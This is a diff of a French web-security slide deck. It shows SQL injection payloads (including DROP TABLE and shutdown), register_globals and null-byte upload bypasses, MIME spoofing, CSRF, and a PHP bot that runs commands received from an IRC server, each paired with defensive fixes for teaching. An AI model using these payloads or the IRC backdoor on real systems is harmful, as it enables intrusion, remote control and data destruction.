@@ -38,7 +38,7 @@
 					<h1>Sécurité</h1>
 					<h3>Des applications web</h3>
 					<p>
-						<small>Created by <a href="#">Thomas PERRIN</a></small>
+						<small>par <a href="#">Thomas PERRIN</a></small>
 					</p>
 					
 				</section>
@@ -261,7 +261,7 @@ http://exemple.com/upload
                             <li><em>HTTP Digest Auth</em></li>
                         </ul>
 
-						<aside class="note">
+						<aside class="notes">
 							
 						</aside>
 					</section>
@@ -291,12 +291,8 @@ http://exemple.com/upload
                             <li><strong>PUT</strong> : Demande d'enregistrement de données encapsulées dans la requête</li>
                             <li><strong>DELETE</strong> : Demande de suppression d'une ressource sur le serveur</li>
                             <li><strong>HEAD</strong> : Demande des en-têtes</li>
-                            <!-- <li><strong>TRACE</strong> : Permet de tracer les requête recu par le serveur</li>
-                            <li><strong>OPTIONS</strong> :  Demande des methodes supporter par le serveur</li>
-                            <li><strong>CONNECT</strong> :  Convertis la request en tunnel tcp/ip</li>
-                            <li><strong>PATCH</strong> : Demande de modification partiel d'une ressource sur le serveur</li> -->
                         </ul>
-                        <aside class="note">
+                        <aside class="notes">
                             <p>Liste exhaustive des verbes :</p>
 							<ul>
                                 <li><strong>GET</strong> : Demande d'une ressources comme une page web en fonction d'une URL</li>
@@ -304,7 +300,7 @@ http://exemple.com/upload
                                 <li><strong>PUT</strong> : Demande d'enregistrement de données encapsulées dans la requête</li>
                                 <li><strong>DELETE</strong> : Demande de suppression d'une ressource sur le serveur</li>
                                 <li><strong>HEAD</strong> : Demande des en-têtes</li>
-								<li><strong>TRACE</strong> : Permet de tracer les requête reçues par le serveur</li>
+								<li><strong>TRACE</strong> : Permet de tracer les requêtes reçues par le serveur</li>
 								<li><strong>OPTIONS</strong> :  Demande des méthodes supportées par le serveur</li>
 								<li><strong>CONNECT</strong> :  Convertit la requête en tunnel TCP/IP</li>
 								<li><strong>PATCH</strong> : Demande de modification partielle d'une ressource sur le serveur</li>
@@ -354,7 +350,7 @@ Cache-Control: max-age=0
 
 					</section>
 				</section>
-				<section data-background="images/home_hacker.jpg">
+				<section>
 					<section>
 						<h2>Injections</h2>
 						<p>
@@ -377,73 +373,75 @@ Cache-Control: max-age=0
 						<h2>Injections sql</h2>
 						
 						<p>
-							Le but d'une injection SQL est de faire exécuter une requête sql au serveur afin de modifier son comportement.
+							Le but d'une injection SQL est de faire exécuter une requête SQL au serveur afin de modifier son comportement.
 						</p>
 
 
 					</section>
 					<section>
-						<h2>Injections sql - Exemple 1</h2>
+						<h2>Injections SQL - Exemple 1</h2>
 						
 						<p>
-							L'attaquant va essayer de passé l'interface d'admin en injectant du code SQL dans le password afin de cour circuiter la verification de la validité du mot de passe.
-							<pre><code data-trim class="php">
+							L'attaquant va injecter du code SQL dans le mot de passe afin de court-circuiter la vérification de sa validité.
+                        </p>
+                        <pre><code data-trim class="php">
 $query = $pdo->prepare("select * from FROM users WHERE username='$username' AND password='$password'");
 $user = $query->execute();
-							</code></pre>
+                        </code></pre>
+                        <p>
 							La requête exécutée est donc :
-							<pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' AND password='admin'</code></pre>
-
-							Maintenant si a la place de <code data-trim class="php">$password</code> l'utilisateur(ou plutôt le vilain hacker) met :
+                        </p>
+                        <pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' AND password='admin'</code></pre>
+                        <p>
+							Maintenant, si a la place de <code data-trim class="php">$password</code> l'attaquant met :
+                        </p>
 							<pre><code data-trim class="php">' OR '1'='1</code></pre>
 							<pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' OR '1'='1' AND password='' </code></pre>
 							<pre><code data-trim class="sql">' OR 1=1"); DROP TABLE users; </code></pre>
 							<pre><code data-trim class="sql">'; shutdown with nowait; -- </code></pre>
-						</p>
-
-
 					</section>
 					<section>
-					<h2>Injections sql - Exemple 2</h2>
+					<h2>Injections SQL - Exemple 2</h2>
 						
 						<p>
-							La requête : 
+							La requête :
+                        </p>
 							<pre><code data-trim class="sql">SELECT email from FROM users where username='$username'</code></pre>
-
-							Maintenant si a la place de <code data-trim class="php">$username</code> l'attaquant' met :
+                        <p>
+							Maintenant si à la place de <code data-trim class="php">$username</code> l'attaquant met :
+                        </p>
 							<pre><code data-trim class="sql">' UNION SELECT password FROM users WHERE id=1</code></pre>
 							<pre><code data-trim class="sql">SELECT email from FROM users WHERE username='' UNION SELECT password FROM users WHERE id=1</code></pre>
-						</p>
 					</section>
 					<section>
-						<h2>Injections sql - Le but</h2>
-						<p>
-							<ul>
-								<li>accéder à des données auxquelles on ne devrait pas avoir accès,</li>
-								<li>modifier des données,</li>
-								<li>effacer des données,</li>
-								<li>lire/écrire sur le système de fichier,</li>
-								<li>exécuter des commandes systèmes.</li>
-							</ul>
-							<a href="http://www.cgsecurity.org/Articles/sql_injection/">http://www.cgsecurity.org/Articles/sql_injection/</a>
+						<h2>Injections SQL - Le but</h2>
+						<ul>
+							<li>Accéder à des données auxquelles on ne devrait pas avoir accès</li>
+							<li>Modifier des données</li>
+							<li>Effacer des données</li>
+							<li>Lire/écrire sur le système de fichiers</li>
+							<li>Exécuter des commandes systèmes</li>
+						</ul>
+                        <p>
+                            <a href="http://www.cgsecurity.org/Articles/sql_injection/">http://www.cgsecurity.org/Articles/sql_injection/</a>
 							<a href="https://www.owasp.org/index.php/Blind_SQL_Injection">https://www.owasp.org/index.php/Blind_SQL_Injection</a>
 						</p>
 					</section>
 					<section>
-						<h2>Injections sql - Solutions</h2>
-						<p>
-							<ul>
-								<li>Ne pas afficher les erreurs mysql</li>
-								<li>Échappement des caractères spéciaux
-									<ul>
-										<li>$mysqli->real_escape_string() depuis PHP 5.5</li>
-										<li>mysqli_escape_string() pour les versions antérieurs</li>
-									</ul>
-								</li>
-								<li>Utilisation d'une requête préparée</li>
-								<li>Utiliser des comptes utilisateurs SQL à accès limité (en lecture-seule) quand cela est possible.</li>
-							</ul>
-						</p>
+						<h2>Injections SQL - Solutions</h2>
+
+                        <ul>
+                            <li>Ne pas afficher les erreurs <em>mysql</em></li>
+                            <li>Échapper les caractères spéciaux
+                                <ul>
+                                    <li><em>$mysqli->real_escape_string()</em> depuis PHP 5.5</li>
+                                    <li><em>mysqli_escape_string()</em> pour les versions antérieures</li>
+                                </ul>
+                            </li>
+                            <li>Utiliser une requête préparée</li>
+                            <li>Utiliser des comptes utilisateurs SQL à accès limité (en lecture-seule) quand cela est possible.</li>
+                        </ul>
+
 					</section>
 				</section>
 				<section>
@@ -454,52 +452,57 @@ $user = $query->execute();
 						</p>
 					</section>
 					<section>
-						<h2>Injection PHP- Register global</h2>
+						<h2>Injection PHP- <em>Register</em> global</h2>
 						<p>
-							La faille de sécurité "Register global" viens d'une configuration de php <a href="http://php.net/manual/fr/security.globals.php">register_globals</a> qui si elle est activé peut facilité la création de faille. 
-							Si le register_globals a la valeur 'On' alors toutes les variables $_GET, $_POST, $_SERVER sont diponible sous la forme de variable PHP.
-
-							<pre><code data-trim class="php">
-// $username est injecté par php directement si register_globals = On
+							La faille de sécurité "<em>Register</em> global" vient d'une configuration de PHP <a href="http://php.net/manual/fr/security.globals.php"><em>register_globals</em></a> qui, si elle est activée peut faciliter la création de failles.
+							Si le <em>register_globals</em> a la valeur '<em>On</em>' alors toutes les variables $_GET, $_POST, $_SERVER sont diponibles sous la forme de variables PHP.
+                        </p>
+                        <pre><code data-trim class="php">
+// $username est injecté par PHP directement si register_globals = On
 $username    == $_POST['username']
 $username    == $_GET['username']
 $username    == $_SESSION['username']
 $httpReferer == $_SERVER['HTTP_REFERER']
-							</code></pre>
-						</p>
-						<aside class="note">
-							PHP 5.3 obsolète
-							PHP 5.4 supprimé
+                        </code></pre>
+
+						<aside class="notes">
+                            <ul>
+                                <li>
+                                    PHP 5.3 obsolète
+                                </li>
+                                <li>
+                                    PHP 5.4 supprimé
+                                </li>
+                            </ul>
 						</aside>
 					</section>
 					<section>
-						<h2>Register global - Exemple</h2>
-						<p>
-							<pre><code data-trim class="php">
+						<h2><em>Register</em> global - Exemple</h2>
+
+                        <pre><code data-trim class="php">
 if($logged){
-	// display admin information
+// display admin information
 }
-							</code></pre>
-							<pre><code data-trim class="php">
-								http://example.com/admin?logged=1
-							</code></pre>
-						</p>
+                        </code></pre>
+                        <pre><code data-trim class="php">
+                            http://example.com/admin?logged=1
+                        </code></pre>
+
 					</section>
 					<section>
-						<h2>Register global - Solution</h2>
-						<p>
-							<ul>
-								<li>Faire attention au variable que l'on utilise</li>
-								<li>Désactivé les register_globals dans la config de php</li>
-							</ul>
-						</p>
+						<h2><em>Register</em> global - Solution</h2>
+                        <ul>
+                            <li>Faire attention aux variables qu'on utilise</li>
+                            <li>Désactiver les <em>register_globals</em> dans la config de PHP</li>
+                        </ul>
 					</section>
 					<section>
 						<h2>Injection PHP</h2>
 						
 						<p>
-							Certain site permettent au utilisateur de contribué directement du code php. (ex: Drupal)
- 							<pre><code data-trim class="php">
+							Certains sites permettent aux utilisateurs de contribuer directement du code PHP. (ex: Drupal)
+                        </p>
+ 						<pre><code data-trim class="php">
 set_time_limit(0);
 $socket = fsockopen('irc.epiknet.org','6667');
 
@@ -525,27 +528,27 @@ while($continuer)
 	if($rtrim($retour[0]) == 'PRIVMSG')
 		exec($retour[3]);
 }
-							</code></pre>
-						</p>
+						</code></pre>
+
 					</section>
 				</section>
 				<section>
 					<section>
-						<h2>XSS - Cross site scripting</h2>
+						<h2>XSS - <em>Cross Site Scripting</em></h2>
 						<p>
-							XSS où « Cross-Site Scripting » est l’une des failles les plus répandues dans les sites Web dynamiques. Elle fait partie de la famille des attaques par injection.
+							XSS où « <em>Cross-Site Scripting</em> » est l’une des failles les plus répandues dans les sites Web dynamiques. Elle fait partie de la famille des attaques par injection.
 						</p>
 						<p>
 							Le but de cette attaque est d’effectuer un certain nombre d’actions dans le navigateur de la victime.
 						</p>
 						<p>
 							Les risques sont multiples :
-							<ul>
-								<li>Défacement</li>
-								<li>Redirection</li>
-								<li>Vol de données</li>
-							</ul>
-						</p>
+                        </p>
+                        <ul>
+                            <li>Défacement</li>
+                            <li>Redirection</li>
+                            <li>Vol de données</li>
+                        </ul>
 					</section>
 					<section>
 						<h2>Injection XSS</h2>
@@ -574,33 +577,33 @@ while($continuer)
 					</section>
 					<section>
 						<h2>Injection XSS - Solution</h2>
-						<p>
-							<ul>
-								<li>
-									Supprimer les balises html des données venant des utilisateur mais aussi de la base de donnée
-									<ul>
-										<li>htmlspecialchars()</li>
-										<li>htmlentities()</li>
-										<li>strip_tags()</li>
-									</ul>
-								</li>
-							</ul>
-						</p>
+
+                        <ul>
+                            <li>
+                                Supprimer les balises HTML des données venant des utilisateurs mais aussi de la base de données
+                                <ul>
+                                    <li><em>htmlspecialchars()</em></li>
+                                    <li><em>htmlentities()</em></li>
+                                    <li><em>strip_tags()</em></li>
+                                </ul>
+                            </li>
+                        </ul>
+
 					</section>
 					<section>
-						<h2>Injection CSRF - Cross Site request forgery</h2>
+						<h2>Injection CSRF - <em>Cross Site Request Forgery</em></h2>
 						
 						<p>
-							L'approche est la même que les XSS mais le but est différent il s'agit de faire exécuter une requête à une victime.
-							<pre><code data-trim class="html">
-								<img src="/post/2/delete" />
-							</code></pre>
-						</p>
+							L'approche est la même que les XSS mais le but est différent : il s'agit de faire exécuter une requête à une victime.
+                        </p>
+                        <pre><code data-trim class="html">
+                            <img src="/post/2/delete" />
+                        </code></pre>
 					</section>
 					<section>
-						<h2>Inject CSRF - Solutions</h2>
+						<h2>Injection CSRF - Solutions</h2>
 						<p>
-							Utilisation de token csrf pour eviter que des requête puisssent etre rejouer.
+							Utilisation de token CSRF pour éviter que des requête puisssent être rejouées.
 						</p>
 					</section>
 				</section>
@@ -608,76 +611,79 @@ while($continuer)
 				<section>
 					<h2>Les faille Upload/LFI/RFI</h2>
 					<p>
-						Ces failles sont du a des faille dans les script d'upload ou dans l'inclusions de fichier sans contrôle dans une page.
+						Ces failles sont dûes à des failles dans les script d'upload ou dans l'inclusion de fichiers sans contrôle dans une page.
 					</p>
 				</section>
 
 				<section>
 					<section>
-						<h2>Faille upload</h2>
+						<h2>Faille <em>upload</em></h2>
 						<p>
-							La faille upload permet a un attaquant d'uploader un fihcier sur le serveur qui va contenir du code malveillant.
+							La faille <em>upload</em> permet a un attaquant d'uploader un fichier sur le serveur qui va contenir du code malveillant.
 
-							L'objectif est de corrompre le serveur grâce à des trojan, worm, et autre malware.
+							L'objectif est de corrompre le serveur grâce à des <em>trojan</em>, <em>worm</em>, et autre <em>malware</em>.
 						</p>
 					</section>
 					<section>
-						<h2>Faille upload - Basic</h2>
-						<p>
-							<pre><code data-trim class="php">
+						<h2>Faille <em>upload</em> - Basique</h2>
+                        <pre><code data-trim class="php">
 $resultat = move_uploaded_file($_FILES['avatar']['tmp_name'],'files/'.$_FILES['avatar']['name']);
 if ($resultat) echo "Transfert réussi";
-							</code></pre>
-							Ici aucun contrôle sur le fichier uploader donc n'importe quel fichier pourrait être uploader sur le serveur(Un fichier php par exemple).
+                        </code></pre>
+                        <p>
+							Ici, aucun contrôle n'est réalisé sur le fichier chargé donc n'importe quel fichier pourrait être uploadé sur le serveur (un fichier PHP, par exemple).
 						</p>
 					</section>
 
 					<section>
-						<h2>Faille upload - Null byte</h2>
-						<p>
-							<pre><code class="php">
+						<h2>Faille <em>upload</em> - <em>Null byte</em></h2>
+
+						<pre><code class="php">
 $extensions_valides = array( 'jpg' , 'jpeg' , 'gif' , 'png' );
 //1. strrchr renvoie l'extension avec le point (« . »).
 //2. substr(chaine,1) ignore le premier caractère de chaine.
 //3. strtolower met l'extension en minuscules.
 $extension_upload = strtolower(  substr(  strrchr($_FILES['avatar']['name'], '.')  ,1)  );
 if ( in_array($extension_upload,$extensions_valides) ) echo "Extension correcte";
-							</code></pre>
-							Ici on verifie l'extension du fichier uploader. <br /><br />
-							Les Null byte sont des caractère avec la valeur zéro qui en principe marque la fin d'une chaine de caractere. si un attaquant voulais uploader quand même un fichier php il lui suffirait de renomer son fichier :
-							<pre><code>c99.php%00.png</code></pre>
-						</p>
+						</code></pre>
+                        <p>
+							Ici, on vérifie l'extension du fichier uploadé. <br /><br />
+							Les <em>Null bytes</em> sont des caractères avec la valeur zéro qui en principe marque la fin d'une chaine de caractères. Si un attaquant voulait uploader quand même un fichier PHP, il lui suffirait de renommer son fichier :
+                        </p>
+						<pre><code>c99.php%00.png</code></pre>
+
 					</section>
 					<section>
-						<h2>Faille upload - Spoofing mime-type</h2>
+						<h2>Faille <em>upload</em> - Spoofing mime-type</h2>
 						<p>
-							Certain site vont verifier le mime type, le type de fichier uploader. 
-							Exaemple de données envoyées en POST lors d'un upload : 
-							<pre><code>-----------------------------312964014798731795365001168\r\n
+							Certains sites vont vérifier le <em>mime-type</em>, le type de fichier uploadé.
+							Exemple de données envoyées en POST lors d'un upload :
+                        </p>
+						<pre><code>-----------------------------312964014798731795365001168\r\n
 Content-Disposition: form-data; name="file"; filename="test.php"\r\n
 Content-Type: text/php\r\n\r\n<?php\necho 'powned';\n?>\r\n
 -----------------------------312964014798731795365001168--\r\n</code></pre>
-							Pour modifier le type de fichier il suffit de modifier :
-							<pre><code>-----------------------------312964014798731795365001168\r\n
+                        <p>
+							Pour modifier le type de fichier, il suffit de modifier :
+                        </p>
+						<pre><code>-----------------------------312964014798731795365001168\r\n
 Content-Disposition: form-data; name="file"; filename="test.php"\r\n
 Content-Type: image/jpeg\r\n\r\n<?php\necho 'powned';\n?>\r\n
 -----------------------------312964014798731795365001168--\r\n</code></pre>
-						</p>
+
 					</section>
 					<section>
-						<h2>Faille upload - Solutions</h2>
-						<p>
-							<ul>
-								<li>Ne jamais se fier à ce que peut envoyer le client.</li>
-								<li>Vérifier la configuration d’Apache afin d’agir en conséquence.</li>
-								<li>Ne pas placer le .htaccess dans le répertoire d’upload</li>
-								<li>Ne pas permettre l’écrasement de fichier</li>
-								<li>Générer un nom aléatoire pour le fichier uploadé et enregistrer le nom dans une base de données.</li>
-								<li>Ne pas permettre de voir l’index of du répertoire d’upload.</li>
-								<li>Assigner les bonnes permissions au répertoire.</li>
-								<li>Vérifier le mime-type avec getimagesize() et l’extension du fichier.</li>
-							</ul>
-						</p>
+						<h2>Faille <em>upload</em> - Solutions</h2>
+						<ul>
+                            <li>Ne jamais se fier à ce que peut envoyer le client.</li>
+                            <li>Vérifier la configuration d’Apache afin d’agir en conséquence.</li>
+                            <li>Ne pas placer le .htaccess dans le répertoire d’upload</li>
+                            <li>Ne pas permettre l’écrasement de fichier</li>
+                            <li>Générer un nom aléatoire pour le fichier uploadé et enregistrer le nom dans une base de données.</li>
+                            <li>Ne pas permettre de voir l’index du répertoire d’upload.</li>
+                            <li>Assigner les bonnes permissions au répertoire.</li>
+                            <li>Vérifier le <em>mime-type</em> avec <em>getimagesize()</em> et l’extension du fichier.</li>
+						</ul>
 					</section>
 				</section>
 
@@ -685,12 +691,12 @@ Content-Type: image/jpeg\r\n\r\n<?php\necho 'powned';\n?>\r\n
 					<section>
 						<h2>Faille LFI/RFI</h2>
 						<p>
-							Les faille lfi/rfi viennent d'un appel à la fonction php <code class="php">include</code> non sécurisé qui permet d'inclure soit à des fichiers locaux(LFI - Local file include), ou d'injecter un script php distant(RFI - Remote file include)
+							Les failles LFI/RFI viennent d'un appel à la fonction PHP <code class="php">include</code>, non sécurisée, qui permet d'inclure soit à des fichiers locaux (LFI - <em>Local File Include</em>), ou d'injecter un script PHP distant (RFI - <em>Remote File Include</em>)
 						</p>
 					</section>
 
 					<section>
-						<h2>Faille include</h2>
+						<h2>Faille LFI/RFI</h2>
 						<pre><code class="php">$incfile = $_REQUEST["file"];
 include($incfile.".php");</code></pre>
 						<p>
@@ -700,19 +706,19 @@ include($incfile.".php");</code></pre>
 				</section>
 				<section>
 					<h2>La boite à outils</h2>
-					<p>
-						<ul>
-							<li><a href="https://code.google.com/p/patator/">Patator brute-forcer</a></li>
-							<li><a href="http://dotdotpwn.sectester.net/">dotdotpwn - Directory Traversal Fuzzer</a></li>
-							<li><a href="http://sqlmap.org/">SQLMap</a></li>
-							<li><a href="https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project">SQLiX</a></li>
-							<li><a href=""></a>Tamper Data</li>
-							<li><a href="">fimap</a></li>
-						</ul>
-					</p>
+
+                    <ul>
+                        <li><a href="https://code.google.com/p/patator/">Patator brute-forcer</a></li>
+                        <li><a href="http://dotdotpwn.sectester.net/">dotdotpwn - Directory Traversal Fuzzer</a></li>
+                        <li><a href="http://sqlmap.org/">SQLMap</a></li>
+                        <li><a href="https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project">SQLiX</a></li>
+                        <li>Tamper Data</li>
+                        <li>fimap</li>
+                    </ul>
+
 				</section>
 				<section>
-					<h1>Questions ?</h1>
+					<h1>Questions ? Doliprane ?</h1>
 				</section>
 
 			</div>
